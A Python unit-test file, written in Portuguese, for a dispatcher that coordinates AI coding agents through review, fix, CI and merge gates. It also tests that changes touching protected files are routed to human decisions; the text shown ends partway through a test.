import copy
import datetime
import io
import json
import os
import pathlib
import stat
import subprocess
import sys
import tempfile
import unittest
from unittest import mock

RAIZ_SCRIPTS = pathlib.Path(__file__).resolve().parent
sys.path.insert(0, str(RAIZ_SCRIPTS))

import despachante  # noqa: E402
import estado as est  # noqa: E402
import forja  # noqa: E402
import motor  # noqa: E402
import prompts  # noqa: E402

SCRIPT = RAIZ_SCRIPTS / "despachante.py"
REPO = "dono/cliente"
PROJETO = "prj_cliente"
PR = "https://github.com/dono/cliente/pull/7"
PR_ORQ = "https://github.com/dono/cliente/pull/90"
H1 = "1" * 40
H2 = "2" * 40
H3 = "3" * 40
TOKEN = "tok-secreto-warren-123456"
TOKEN_GH = "ghp_segredo_github_987654"


def _modelo(modelo, custo, esforco="medium"):
    return {"agente": "claude-code", "modelo": modelo, "esforco": esforco, "maxCustoUsd": custo}


SONNET = "claude-sonnet-5-5"
OPUS = "claude-opus-5-5"
HAIKU = "claude-haiku-5-5"
FABLE = "claude-fable-5-1"

CONFIG = {
    "limiteParalelo": 3,
    "branchPadrao": "main",
    "protegidos": ["**/migrations/**", ".github/**", ".fabrica/config.json", "**/auth/**", ".env*"],
    "modelos": {
        "orquestrador": _modelo(FABLE, 20, "high"),
        "arquiteto": _modelo(SONNET, 10),
        "produto": _modelo(HAIKU, 5),
        "ux-ui": _modelo(SONNET, 10),
        "frontend": _modelo(SONNET, 10),
        "backend": _modelo(SONNET, 10),
        "qa": _modelo(SONNET, 10),
        "revisor": _modelo(OPUS, 5),
        "devops": _modelo(SONNET, 10),
        "seguranca": _modelo(SONNET, 10),
        "fixer": _modelo(HAIKU, 5),
    },
    "verificacao": {"imagem": "node:22-bookworm", "memoria": "3g", "cpus": "2", "rede": "internet"},
}


def raia(id_, papel="backend", plano_seeds="pl-000a", depende=(), arquivos=None, verificacao="pnpm test"):
    return {
        "id": id_,
        "papel": papel,
        "planoSeeds": plano_seeds,
        "dependeDe": list(depende),
        "arquivos": arquivos or [f"src/{id_}/"],
        "verificacao": verificacao,
        "criteriosAceite": [f"{id_} pronta"],
    }


def plano(*raias_, fase="f1"):
    return {
        "versao": 1,
        "faseAtual": fase,
        "fases": [{"id": fase, "raias": [r["id"] for r in raias_]}],
        "raias": list(raias_),
    }


def veredito_texto(sha, resultado="aprovado", achados=()):
    corpo = json.dumps({"sha": sha, "resultado": resultado, "achados": list(achados)})
    return f"Revisei o diff.\n{prompts.INICIO_VEREDITO}\n{corpo}\n{prompts.FIM_VEREDITO}\n"


def _gerar_head(n):
    return ("%x" % n).rjust(40, "e")


class _AjudasDoOrquestrador:
    def acordar_por_falha(self, plano_=None):
        d = self.preparar_raia(plano_)
        self.motor.definir_plano("plano-1", "failed", [], falha="cancelado")
        d.ciclo()
        orq = self.estado()["orquestrador"]
        self.assertEqual(orq["motivo"], "raia_falhou")
        return d, orq["runId"]

    def pr_do_orquestrador(self, run_id, arquivos, plano_=None, pergunta=None, head=H3, url=PR_ORQ, ci="verde"):
        self.motor.definir_run(run_id, estado="succeeded", prUrl=url)
        self.forja.definir_pr(url, head_sha=head, branch="warren/orq", arquivos=list(arquivos))
        if ci is not None:
            self.forja.definir_ci(REPO, head, ci)
        if plano_ is not None:
            self.publicar(plano_, ref=head)
        if pergunta is not None:
            self.forja.definir_arquivo(REPO, head, ".fabrica/pergunta.md", pergunta)

    def orquestrador(self):
        return self.estado()["orquestrador"]


class Base(_AjudasDoOrquestrador, unittest.TestCase):
    def setUp(self):
        tmp = tempfile.TemporaryDirectory()
        self.addCleanup(tmp.cleanup)
        self.tmp = pathlib.Path(tmp.name)
        self.raiz = self.tmp / "raiz"
        self.raiz.mkdir()
        self.repo_dir = self.tmp / "repo"
        self.repo_dir.mkdir()
        self.motor = motor.MotorFalso()
        self.forja = forja.ForjaFalsa()
        self.verificacoes = []
        self.codigos = {}
        self.limpezas = []
        self.instante = datetime.datetime(2026, 11, 3, 12, 0, 0)

    def verificar_falso(self, repo_dir, sha, comando, *, conteiner):
        self.verificacoes.append((repo_dir, sha, comando, conteiner))
        return {"sha": sha, "codigo": self.codigos.get(sha, 0), "saida": f"saída da verificação de {sha[:4]}"}

    def limpar_falso(self):
        self.limpezas.append(1)
        return {"conteineres": 2, "redes": 1, "diretorios": 0, "erros": []}

    def novo(self, *, config=None, motor_=None, forja_=None, **extra):
        argumentos = dict(
            motor=motor_ or self.motor,
            forja=forja_ or self.forja,
            raiz=self.raiz,
            repo_dir=self.repo_dir,
            config=copy.deepcopy(config if config is not None else getattr(self, "config_padrao", CONFIG)),
            verificar=self.verificar_falso,
            agora=lambda: self.instante,
            projeto=PROJETO,
            repo=REPO,
            limpar_residuos=self.limpar_falso,
            segredos=(TOKEN, TOKEN_GH),
        )
        argumentos.update(extra)
        return despachante.Despachante(**argumentos)

    def publicar(self, plano_, ref="main"):
        texto = plano_ if isinstance(plano_, str) else json.dumps(plano_)
        self.forja.definir_arquivo(REPO, ref, ".fabrica/plano.json", texto)

    def estado(self):
        return json.loads((self.raiz / "estado.json").read_text(encoding="utf-8"))

    def log(self):
        caminho = self.raiz / "log.jsonl"
        if not caminho.exists():
            return []
        return [json.loads(linha) for linha in caminho.read_text(encoding="utf-8").splitlines()]

    def acordadas(self):
        caminho = self.raiz / "acordadas.jsonl"
        if not caminho.exists():
            return []
        return [json.loads(linha) for linha in caminho.read_text(encoding="utf-8").splitlines()]

    def runs(self, modelo=None):
        return [
            a
            for nome, a in self.motor.chamadas
            if nome == "despachar_run" and (modelo is None or a["modelo"] == modelo)
        ]

    def planos_despachados(self):
        return [a for nome, a in self.motor.chamadas if nome == "despachar_plano"]

    def preparar_raia(self, plano_=None):
        self.publicar(plano_ or plano(raia("a")))
        d = self.novo()
        d.iniciar()
        d.ciclo()
        return d

    def abrir_pr(self, head=H1, arquivos=("src/a/x.ts",), ci="verde", plan_run="plano-1", seed="s-1", url=PR):
        self.motor.definir_plano(
            plan_run, "running", [{"seedId": seed, "estado": "pr_open", "runId": "run-filho", "prUrl": url}]
        )
        self.forja.definir_pr(url, head_sha=head, branch="warren/" + seed, arquivos=list(arquivos))
        self.forja.definir_ci(REPO, head, ci)

    def mover_head(self, head, ci="verde", arquivos=("src/a/x.ts",)):
        self.forja.definir_pr(PR, head_sha=head, branch="warren/s-1", arquivos=list(arquivos))
        self.forja.definir_ci(REPO, head, ci)

    def terminar_revisao(self, sha, resultado="aprovado", achados=(), seed="s-1"):
        rid = self.estado()["seeds"][seed]["revisaoRunId"]
        self.assertTrue(rid, "não há revisão em curso")
        self.motor.definir_run(rid, estado="succeeded")
        self.motor.definir_texto(rid, veredito_texto(sha, resultado, achados))
        return rid




# ---------------------------------------------------------------- jornadas do brief


class TestesJornada(Base):
    def test_jornada_de_uma_seed_ate_o_merge(self):
        d = self.preparar_raia()
        despachos = self.planos_despachados()
        self.assertEqual(len(despachos), 1)
        template = despachos[0].pop("prompt_template")
        self.assertEqual(
            despachos[0],
            {"projeto": PROJETO, "plano_seeds": "pl-000a", "agente": "claude-code", "modelo": SONNET, "max_custo_usd": 10},
        )
        base, marca = template.rsplit("\n", 1)
        self.assertEqual(base, prompts.prompt_template_raia("backend"))
        self.assertRegex(marca, r"^<!-- fabrica:nonce=[0-9a-f]{32} -->$")
        self.assertIn("{seed_id}", template)
        self.assertEqual(self.estado()["raias"]["a"]["estado"], "executando")

        self.abrir_pr(H1)
        acoes = d.ciclo()
        self.assertEqual([a["tipo"] for a in acoes], ["revisar", "verificar"])
        self.assertEqual(self.estado()["seeds"]["s-1"]["estado"], "em_revisao")
        (revisao,) = self.runs()
        self.assertEqual(revisao["modelo"], OPUS)
        self.assertEqual(revisao["agente"], "claude-code")
        self.assertEqual(revisao["max_custo_usd"], 5)
        self.assertEqual(revisao["branch_existente"], "warren/s-1")
        self.assertEqual(revisao["projeto"], PROJETO)
        base, marca = revisao["prompt"].rsplit("\n", 1)
        self.assertEqual(base, prompts.prompt_revisor(seed_id="s-1", raia=raia("a"), sha=H1))
        self.assertRegex(marca, r"^<!-- fabrica:nonce=[0-9a-f]{32} -->$")
        self.assertEqual(self.verificacoes, [(self.repo_dir, H1, "pnpm test", CONFIG["verificacao"])])
        self.assertEqual(self.forja.merges, [])

        d.ciclo()  # revisão ainda rodando: nada de merge nem de nova revisão
        self.assertEqual(self.forja.merges, [])
        self.assertEqual(len(self.runs()), 1)

        self.terminar_revisao(H1)
        acoes = d.ciclo()
        self.assertEqual([a["tipo"] for a in acoes], ["mergear"])
        self.assertEqual(self.forja.merges, [(PR, H1)])
        self.assertEqual(self.estado()["seeds"]["s-1"]["estado"], "mergeada")

    def test_gate_vermelho_corrige_uma_vez_e_acorda(self):
        d = self.preparar_raia()
        self.abrir_pr(H1, ci="vermelho")
        d.ciclo()
        self.terminar_revisao(H1)
        acoes = d.ciclo()
        self.assertEqual([a["tipo"] for a in acoes], ["corrigir"])
        (fixer,) = self.runs(HAIKU)
        self.assertEqual(fixer["branch_existente"], "warren/s-1")
        self.assertEqual(fixer["max_custo_usd"], 5)
        self.assertIn("CI vermelho", fixer["prompt"])
        self.assertIn("saída da verificação de 1111", fixer["prompt"])
        self.assertIn(".fabrica/equipes/fixer.md", fixer["prompt"])
        self.assertIn(".fabrica/equipes/backend.md", fixer["prompt"])
        fid = self.estado()["seeds"]["s-1"]["fixerRunId"]

        self.motor.definir_run(fid, estado="succeeded")
        self.mover_head(H2, ci="vermelho")
        acoes = d.ciclo()
        self.assertEqual([(a["tipo"], a["sha"]) for a in acoes], [("revisar", H2), ("verificar", H2)])
        self.terminar_revisao(H2)
        acoes = d.ciclo()
        self.assertEqual(
            [(a["tipo"], a.get("motivo")) for a in acoes], [("acordar", "gate_falhou_apos_fixer")]
        )
        self.assertEqual(len(self.runs(HAIKU)), 1)
        (orq,) = self.runs(FABLE)
        self.assertEqual(orq["branch_existente"], None)
        self.assertEqual(orq["max_custo_usd"], 20)
        self.assertIn("Motivo: gate_falhou_apos_fixer", orq["prompt"])
        self.assertIn('"ci": "vermelho"', orq["prompt"])
        self.assertIn('"seed": "s-1"', orq["prompt"])
        (linha,) = self.acordadas()
        self.assertEqual(set(linha), {"ts", "motivo", "alvo", "runId"})
        self.assertEqual((linha["motivo"], linha["alvo"]), ("gate_falhou_apos_fixer", "s-1"))
        self.assertEqual(linha["runId"], self.estado()["orquestrador"]["runId"])
        self.assertEqual(linha["ts"], self.instante.isoformat())

        d.ciclo()
        d.ciclo()
        self.assertEqual(len(self.runs(FABLE)), 1)
        self.assertEqual(len(self.runs(HAIKU)), 1)
        self.assertEqual(self.forja.merges, [])

    def test_recusa_do_motor_atualiza_o_projeto_e_tenta_de_novo(self):
        self.publicar(plano(raia("a")))
        d = self.novo()
        d.iniciar()
        with mock.patch.object(self.motor, "despachar_plano", side_effect=despachante.RecusaDoMotor("POST /plan-runs: HTTP 400")):
            d.ciclo()
            d.ciclo()
        self.assertEqual(self.estado()["raias"]["a"]["estado"], "planejada")
        self.assertEqual(self.estado()["raias"]["a"]["recusasDoMotor"], 2)
        self.assertEqual(len([1 for nome, _ in self.motor.chamadas if nome == "atualizar_projeto"]), 2)
        self.assertEqual(self.runs(), [])
        d.ciclo()
        self.assertEqual(self.estado()["raias"]["a"]["estado"], "executando")
        self.assertEqual(self.acordadas(), [])

    def test_recusa_do_motor_alem_do_teto_vira_falha_da_raia(self):
        self.publicar(plano(raia("a")))
        d = self.novo()
        d.iniciar()
        with mock.patch.object(self.motor, "despachar_plano", side_effect=despachante.RecusaDoMotor("POST /plan-runs: HTTP 400")):
            for _ in range(despachante.MAX_RECUSAS_DO_MOTOR):
                d.ciclo()
                self.assertEqual(self.estado()["raias"]["a"]["estado"], "planejada")
            d.ciclo()
        self.assertEqual(self.estado()["raias"]["a"]["estado"], "falhou")

    def test_falha_ao_atualizar_o_projeto_nao_derruba_o_ciclo(self):
        self.publicar(plano(raia("a")))
        d = self.novo()
        d.iniciar()
        with mock.patch.object(self.motor, "despachar_plano", side_effect=despachante.RecusaDoMotor("x")), mock.patch.object(
            self.motor, "atualizar_projeto", side_effect=RuntimeError("fora")
        ):
            d.ciclo()
        self.assertEqual(self.estado()["raias"]["a"]["estado"], "planejada")

    def test_github_sem_protecao_na_config_mergeia_sozinho(self):
        config = dict(CONFIG, protegidos=[".env*"])
        self.publicar(plano(raia("a")))
        d = self.novo(config=config)
        d.iniciar()
        d.ciclo()
        self.abrir_pr(H1, arquivos=(".github/workflows/ci.yml", "src/a/x.ts"))
        d.ciclo()
        self.terminar_revisao(H1)
        d.ciclo()
        self.assertEqual(self.forja.merges, [(PR, H1)])

    def test_github_protegido_na_config_continua_parando(self):
        self.publicar(plano(raia("a")))
        d = self.novo()
        d.iniciar()
        d.ciclo()
        self.abrir_pr(H1, arquivos=(".github/workflows/ci.yml",))
        d.ciclo()
        self.terminar_revisao(H1)
        d.ciclo()
        self.assertEqual(self.forja.merges, [])

    def test_gates_da_fabrica_param_mesmo_fora_da_config(self):
        for arquivo in (".fabrica/config.json", ".warren/config.yaml", ".claude/settings.json"):
            with self.subTest(arquivo=arquivo):
                self.setUp()
                self.publicar(plano(raia("a")))
                d = self.novo(config=dict(CONFIG, protegidos=[".env*"]))
                d.iniciar()
                d.ciclo()
                self.abrir_pr(H1, arquivos=(arquivo,))
                d.ciclo()
                self.terminar_revisao(H1)
                d.ciclo()
                self.assertEqual(self.forja.merges, [])

    def test_revisor_sem_commit_vale_pelo_veredito(self):
        # O Warren reapa como falha o run sem commit num branch existente; o revisor não commita por desenho.
        for motivo in ("dropped_commit", "no_changes"):
            with self.subTest(motivo=motivo):
                self.setUp()
                d = self.preparar_raia()
                self.abrir_pr(H1)
                d.ciclo()
                rid = self.terminar_revisao(H1)
                self.motor.definir_run(rid, estado="failed", motivoFalha=motivo)
                self.assertEqual([a["tipo"] for a in d.ciclo()], ["mergear"])
                self.assertEqual(self.forja.merges, [(PR, H1)])

    def test_revisor_sem_commit_e_sem_veredito_conta_como_falha(self):
        d = self.preparar_raia()
        self.abrir_pr(H1)
        d.ciclo()
        rid = self.estado()["seeds"]["s-1"]["revisaoRunId"]
        self.motor.definir_run(rid, estado="failed", motivoFalha="dropped_commit")
        self.motor.definir_texto(rid, "sem veredito")
        d.ciclo()
        self.assertIsNone(self.estado()["seeds"]["s-1"]["veredito"])
        self.assertEqual(self.forja.merges, [])

    def test_revisor_com_outra_falha_nao_vale_mesmo_com_veredito(self):
        for motivo in ("provider_error", "finalize_failed", "cost_cap"):
            with self.subTest(motivo=motivo):
                self.setUp()
                d = self.preparar_raia()
                self.abrir_pr(H1)
                d.ciclo()
                rid = self.terminar_revisao(H1)
                self.motor.definir_run(rid, estado="failed", motivoFalha=motivo)
                d.ciclo()
                self.assertIsNone(self.estado()["seeds"]["s-1"]["veredito"])
                self.assertEqual(self.forja.merges, [])

    def test_fixer_sem_commit_continua_falha(self):
        self.codigos[H1] = 1
        d = self.preparar_raia()
        self.abrir_pr(H1)
        d.ciclo()
        self.terminar_revisao(H1)
        d.ciclo()
        fid = self.estado()["seeds"]["s-1"]["fixerRunId"]
        self.motor.definir_run(fid, estado="failed", motivoFalha="dropped_commit")
        d.ciclo()
        self.assertEqual(self.estado()["seeds"]["s-1"]["estado"], "falhou")

    def test_ci_ausente_vai_para_humano_por_padrao(self):
        d = self.preparar_raia()
        self.abrir_pr(H1, ci="ausente")
        d.ciclo()
        self.terminar_revisao(H1)
        d.ciclo()
        self.assertEqual(self.forja.merges, [])

    def test_ci_nao_obrigatorio_nas_seeds_mergeia_com_os_outros_gates(self):
        self.publicar(plano(raia("a")))
        d = self.novo(config=dict(CONFIG, ciObrigatorioNasSeeds=False))
        d.iniciar()
        d.ciclo()
        self.abrir_pr(H1, ci="ausente")
        d.ciclo()
        self.terminar_revisao(H1)
        d.ciclo()
        self.assertEqual(self.forja.merges, [(PR, H1)])

    def test_ci_obrigatorio_nas_seeds_invalido_sai_com_config_invalida(self):
        with self.assertRaises(despachante.ConfigInvalida):
            despachante._validar_config(dict(CONFIG, ciObrigatorioNasSeeds="nao"))

    def test_fixer_muda_head_e_exige_nova_revisao(self):
        self.codigos[H1] = 1
        d = self.preparar_raia()
        self.abrir_pr(H1)
        d.ciclo()
        self.terminar_revisao(H1)  # aprovado no head antigo
        self.assertEqual([a["tipo"] for a in d.ciclo()], ["corrigir"])
        fid = self.estado()["seeds"]["s-1"]["fixerRunId"]
        self.motor.definir_run(fid, estado="succeeded")
        self.mover_head(H2)
        acoes = d.ciclo()
        self.assertEqual([(a["tipo"], a["sha"]) for a in acoes], [("revisar", H2), ("verificar", H2)])
        self.assertEqual(self.forja.merges, [])

        # um veredito que ainda fala do head antigo não libera o merge
        self.terminar_revisao(H1)
        acoes = d.ciclo()
        self.assertNotIn("mergear", [a["tipo"] for a in acoes])
        self.assertEqual(self.forja.merges, [])

        self.terminar_revisao(H2)
        d.ciclo()
        self.assertEqual(self.forja.merges, [(PR, H2)])

    def test_admissao_cheia_adia_sem_duplicar(self):
        self.publicar(plano(raia("a")))
        d = self.novo()
        d.iniciar()
        self.motor.lotar()
        d.ciclo()
        disco = self.estado()
        self.assertEqual(disco["raias"]["a"]["estado"], "planejada")
        self.assertIsNone(disco["raias"]["a"]["planRunId"])
        self.assertNotIn("acaoEmCurso", disco)
        d.ciclo()
        self.assertEqual(self.estado()["raias"]["a"], dict(self.estado()["raias"]["a"], estado="executando"))
        self.assertEqual(self.estado()["raias"]["a"]["planRunId"], "plano-1")
        d.ciclo()
        self.assertEqual(len(self.planos_despachados()), 2)  # um recusado, um aceito
        self.assertEqual(self.motor.plano("plano-1")["estado"], "running")
        with self.assertRaises(KeyError):
            self.motor.plano("plano-2")

    def test_admissao_cheia_na_revisao_adia_sem_escalar(self):
        d = self.preparar_raia()
        self.abrir_pr(H1)
        self.motor.lotar()
        d.ciclo()
        seed = self.estado()["seeds"]["s-1"]
        self.assertIsNone(seed["revisaoRunId"])
        self.assertIsNone(seed["pendenteHumano"])
        self.assertEqual(seed["tentativasRevisao"], 0)
        d.ciclo()
        self.assertEqual(len(self.runs(OPUS)), 2)  # uma recusada, uma aceita
        self.assertTrue(self.estado()["seeds"]["s-1"]["revisaoRunId"])
        d.ciclo()
        self.assertEqual(len(self.runs(OPUS)), 2)

    def test_reinicio_nao_redespacha(self):
        d = self.preparar_raia()
        self.abrir_pr(H1)
        d.ciclo()
        planos, runs, verifs = len(self.planos_despachados()), len(self.runs()), len(self.verificacoes)
        del d
        outro = self.novo()
        outro.ciclo()
        outro.ciclo()
        self.assertEqual(len(self.planos_despachados()), planos)
        self.assertEqual(len(self.runs()), runs)
        self.assertEqual(len(self.verificacoes), verifs)

    def test_protegido_abre_decisao_e_nao_mergeia(self):
        d = self.preparar_raia()
        self.abrir_pr(H1, arquivos=("src/a/x.ts", "prisma/migrations/001.sql"))
        d.ciclo()
        self.terminar_revisao(H1)
        acoes = d.ciclo()
        self.assertEqual([a["tipo"] for a in acoes], ["aguardar_humano"])
        self.assertEqual(self.forja.merges, [])
        ((titulo, corpo),) = self.forja.decisoes
        self.assertEqual(titulo, "[fábrica] s-1: decisão necessária")
        self.assertIn("toca arquivos protegidos: prisma/migrations/001.sql", corpo)
        self.assertIn(PR, corpo)
        disco = self.estado()
        self.assertEqual(disco["seeds"]["s-1"]["estado"], "bloqueada_humano")
        self.assertEqual(
            disco["decisoes"],
            [
                {
                    "url": "https://github.com/dono/cliente/issues/1",
                    "motivo": "toca arquivos protegidos: prisma/migrations/001.sql",
                    "alvo": "s-1",
                    "titulo": "[fábrica] s-1: decisão necessária",
                    "pr": PR,
                }
            ],
        )
        d.ciclo()
        self.assertEqual(len(self.forja.decisoes), 1)
        self.assertEqual(self.forja.merges, [])

    def test_resposta_do_paulo_acorda_orquestrador(self):
        d = self.preparar_raia()
        self.abrir_pr(H1, arquivos=("db/migrations/002.sql",))
        d.ciclo()
        self.terminar_revisao(H1)
        d.ciclo()
        (decisao,) = self.estado()["decisoes"]
        d.ciclo()  # ainda aberta: nada
        self.assertEqual(self.runs(FABLE), [])
        self.forja.definir_decisao(decisao["url"], fechada=True, ultimo_comentario="Pode seguir com a migração.")
        d.ciclo()
        (orq,) = self.runs(FABLE)
        self.assertIn("Motivo: resposta_paulo", orq["prompt"])
        self.assertIn("Pode seguir com a migração.", orq["prompt"])
        self.assertIn("toca arquivos protegidos", orq["prompt"])
        disco = self.estado()
        self.assertEqual(disco["decisoes"], [])
        self.assertEqual(disco["orquestrador"]["motivo"], "resposta_paulo")
        self.assertIn(f"resposta_paulo:{decisao['url']}", disco["chavesAcordadas"])
        (linha,) = self.acordadas()
        self.assertEqual((linha["motivo"], linha["alvo"]), ("resposta_paulo", decisao["url"]))
        d.ciclo()
        self.assertEqual(len(self.runs(FABLE)), 1)

    def test_resposta_do_paulo_espera_o_orquestrador_livre_sem_se_perder(self):
        d = self.preparar_raia()
        self.abrir_pr(H1, arquivos=("db/migrations/002.sql",))
        d.ciclo()
        self.terminar_revisao(H1)
        d.ciclo()
        (decisao,) = self.estado()["decisoes"]
        # o orquestrador já está ocupado com outra coisa
        self.forja.definir_arquivo(REPO, "main", "docs/spec.md", "# spec")
        d.iniciar(spec="docs/spec.md")
        (primeiro,) = self.runs(FABLE)
        self.forja.definir_decisao(decisao["url"], fechada=True, ultimo_comentario="ok")
        d.ciclo()
        self.assertEqual(len(self.runs(FABLE)), 1)
        self.assertEqual(self.estado()["decisoes"], [])
        self.assertEqual(len(self.estado()["acordarPendentes"]), 1)
        # um novo Despachante (reinício) não perde a resposta
        outro = self.novo()
        rid = self.estado()["orquestrador"]["runId"]
        self.motor.definir_run(rid, estado="succeeded", prUrl=PR_ORQ)
        self.forja.definir_pr(PR_ORQ, head_sha=H3, branch="warren/orq", arquivos=[".fabrica/pergunta.md"])
        self.forja.definir_arquivo(REPO, H3, ".fabrica/pergunta.md", "Qual banco?")
        outro.ciclo()
        segundo = self.runs(FABLE)[-1]
        self.assertIsNot(segundo, primeiro)
        self.assertIn("Motivo: resposta_paulo", segundo["prompt"])
        self.assertEqual(self.estado()["acordarPendentes"], [])

    def test_decisao_fechada_sem_comentario_e_reaberta_e_continua_acompanhada(self):
        d = self.preparar_raia()
        self.abrir_pr(H1, arquivos=("db/migrations/002.sql",))
        d.ciclo()
        self.terminar_revisao(H1)
        d.ciclo()
        (decisao,) = self.estado()["decisoes"]
        self.forja.definir_decisao(decisao["url"], fechada=True, ultimo_comentario="")
        d.ciclo()
        (acompanhada,) = self.estado()["decisoes"]
        # Q3: a reabertura registra a hora e o closed_at visto, para distinguir um fechamento novo de uma leitura velha
        self.assertEqual(acompanhada["fechamentosSemComentario"], 1)
        self.assertTrue(acompanhada["reabertaEm"] and acompanhada["fechadaEmVista"])
        self.assertEqual({k: v for k, v in acompanhada.items() if k not in ("reabertaEm", "fechadaEmVista", "fechamentosSemComentario")}, decisao)
        self.assertEqual(self.runs(FABLE), [])
        info = self.forja.decisao(decisao["url"])
        self.assertFalse(info["fechada"])
        self.assertIn("Feche com um comentário dizendo a decisão", info["ultimoComentario"])
        # Q3: a leitura velha do mesmo fechamento (closed_at igual ao visto) não reabre de novo, e o comentário do
        # próprio despachante nunca vale como resposta
        reaberturas = len([n for n, _ in self.forja.chamadas if n == "reabrir_decisao"])
        self.forja.definir_decisao(
            decisao["url"], fechada=True, ultimo_comentario=info["ultimoComentario"], fechada_em=acompanhada["fechadaEmVista"]
        )
        d.ciclo()
        self.assertEqual(self.runs(FABLE), [])
        self.assertEqual(len([n for n, _ in self.forja.chamadas if n == "reabrir_decisao"]), reaberturas)
        self.assertEqual([x["url"] for x in self.estado()["decisoes"]], [decisao["url"]])
        self.forja.definir_decisao(decisao["url"], fechada=True, ultimo_comentario="Pode mergear.")
        d.ciclo()
        self.assertEqual(self.estado()["decisoes"], [])
        self.assertIn("Pode mergear.", self.runs(FABLE)[-1]["prompt"])

    def test_retomar_do_despachante_zera_falhas_de_acordar(self):
        d = self.preparar_raia()
        d.estado["falhasAcordar"] = 2
        d.estado["pausado"] = "acordar falhou"
        d.retomar()
        self.assertEqual((self.estado()["pausado"], self.estado()["falhasAcordar"]), (None, 0))
        (linha,) = [linha for linha in self.log() if linha.get("evento") == "retomar"]
        self.assertEqual(linha["antes"], {"pausado": "acordar falhou", "falhasAcordar": 2})

    def test_cota_pausa_e_retomar_libera(self):
        d = self.preparar_raia()
        self.abrir_pr(H1)
        d.ciclo()
        rid = self.estado()["seeds"]["s-1"]["revisaoRunId"]
        self.motor.definir_run(rid, estado="failed", motivoFalha="provider_error")
        self.motor.definir_texto(rid, "API Error: 429 rate limit reached")
        self.assertEqual(d.ciclo(), [])
        self.assertEqual(self.estado()["pausado"], "cota")
        self.assertEqual(d.ciclo(), [])
        self.assertEqual(len(self.runs(OPUS)), 1)
        d.retomar()
        disco = self.estado()
        self.assertIsNone(disco["pausado"])
        self.assertEqual(disco["falhasAcordar"], 0)
        acoes = d.ciclo()
        self.assertEqual([a["tipo"] for a in acoes], ["revisar"])
        self.assertEqual(len(self.runs(OPUS)), 2)
        self.assertIn("retomar", [linha.get("evento") for linha in self.log()])


# ---------------------------------------------------------------- preparar_warren (Task 7b)


class TestesPrepararWarren(Base):
    AVISO = despachante.AVISO_WARREN_SEM_MODELO

    def preparar_falso(self, respostas):
        """Um preparar que devolve `respostas` em ordem (a última se repete); grava o ciclo e os kwargs de cada chamada."""
        self.chamadas_preparar = []
        self.kwargs_preparar = []
        respostas = list(respostas)

        def preparar(**kwargs):
            self.chamadas_preparar.append(len(self.ciclos_feitos))
            self.kwargs_preparar.append(kwargs)
            resposta = respostas.pop(0) if len(respostas) > 1 else respostas[0]
            if isinstance(resposta, BaseException):
                raise resposta
            if isinstance(resposta, dict):
                return dict(resposta)
            return {"estado": resposta, "detalhe": "detalhe de " + resposta, "dropin": "ok", "automerge": "ausente", "sha": "a" * 64}

        return preparar

    def rodar_com(self, respostas, ciclos, config=None, passo=None, d=None, dropin_carregado=False):
        """Roda `ciclos` ciclos vazios; com `passo`, o relógio anda `passo` a cada ciclo.

        `dropin_carregado`: F13, um preparo anterior já confirmou o drop-in carregado (teto de drenagem de 45 min)."""
        if d is None:
            self.ciclos_feitos = []
            self.publicar(plano(raia("a")))
            d = self.novo(preparar_warren=self.preparar_falso(respostas), config=config)
            d.iniciar()
            if dropin_carregado:
                d.estado["warrenPreparado"] = {"dropinCarregado": True}
                d._salvar()

        def ciclo():
            self.ciclos_feitos.append(1)
            if passo is not None:
                self.instante += passo
            return []

        d.ciclo = ciclo
        d.rodar(intervalo=1, ciclos=ciclos, dormir=lambda s: None)
        return d

    def avisos_de_modelo(self):
        return [a for a in self.estado().get("avisos", []) if a == self.AVISO]

    def drenagem(self):
        return self.estado().get("drenagemWarren") or {}

    def test_aviso_tem_o_texto_da_decisao(self):
        self.assertIn("não aplica modelo por papel", self.AVISO)
        self.assertIn("conferência de modelo efetivo vai acusar a divergência", self.AVISO)

    def test_chama_na_partida_sob_a_trava_antes_do_primeiro_ciclo(self):
        tentativas = []

        def preparar(**kwargs):
            try:
                with despachante.travar(self.raiz):
                    tentativas.append("livre")
            except despachante.OutroDespachante:
                tentativas.append("tomada")
            tentativas.append(len(ciclos))
            return {"estado": "aplicado", "detalhe": "ok", "dropin": "ok", "automerge": "ausente"}

        ciclos = []
        self.publicar(plano(raia("a")))
        d = self.novo(preparar_warren=preparar)
        d.iniciar()
        d.ciclo = lambda: ciclos.append(1) or []
        d.rodar(intervalo=1, ciclos=1, dormir=lambda s: None)
        self.assertEqual(tentativas, ["tomada", 0])
        preparado = self.estado()["warrenPreparado"]
        self.assertEqual((preparado["estado"], preparado["detalhe"]), ("aplicado", "ok"))
        self.assertEqual((preparado["dropin"], preparado["automerge"]), ("ok", "ausente"))
        (linha,) = [linha for linha in self.log() if linha.get("evento") == "preparar_warren"]
        self.assertEqual((linha["estado"], linha["detalhe"], linha["dropin"], linha["automerge"]), ("aplicado", "ok", "ok", "ausente"))
        self.assertEqual(self.avisos_de_modelo(), [])

    def test_repete_a_cada_20_ciclos_enquanto_nao_preparado(self):
        self.rodar_com(["erro"], ciclos=20)
        self.assertEqual(self.chamadas_preparar, [0])
        self.setUp()
        self.rodar_com(["erro"], ciclos=21)
        self.assertEqual(self.chamadas_preparar, [0, 20])
        self.setUp()
        self.rodar_com(["erro"], ciclos=41)
        self.assertEqual(self.chamadas_preparar, [0, 20, 40])
        self.assertEqual(len([linha for linha in self.log() if linha.get("evento") == "preparar_warren"]), 3)

    def test_aguardando_runs_checa_a_cada_ciclo(self):
        self.rodar_com(["aguardando_runs"], ciclos=5)
        self.assertEqual(self.chamadas_preparar, [0, 1, 2, 3, 4])
        self.assertEqual(self.estado()["warrenPreparado"]["estado"], "aguardando_runs")
        self.assertEqual(self.avisos_de_modelo(), [])

    def test_para_de_chamar_depois_de_aplicado(self):
        self.rodar_com(["aguardando_runs", "aplicado", "aguardando_runs"], ciclos=81)
        self.assertEqual(self.chamadas_preparar, [0, 1])
        self.assertEqual(self.estado()["warrenPreparado"]["estado"], "aplicado")

    def test_ja_aplicado_na_partida_nao_repete(self):
        self.rodar_com(["ja_aplicado", "aplicado"], ciclos=41)
        self.assertEqual(self.chamadas_preparar, [0])

    def test_automerge_ou_dropin_com_erro_seguem_tentando(self):
        for extra in ({"automerge": "erro"}, {"dropin": "erro"}):
            with self.subTest(extra=extra):
                self.setUp()
                resposta = dict({"estado": "ja_aplicado", "detalhe": "", "dropin": "ok", "automerge": "ausente"}, **extra)
                self.rodar_com([resposta], ciclos=41)
                self.assertEqual(self.chamadas_preparar, [0, 20, 40])

    def test_avisos_de_automerge_e_dropin_com_erro(self):
        resposta = {"estado": "aplicado", "detalhe": "", "dropin": "erro", "automerge": "erro"}
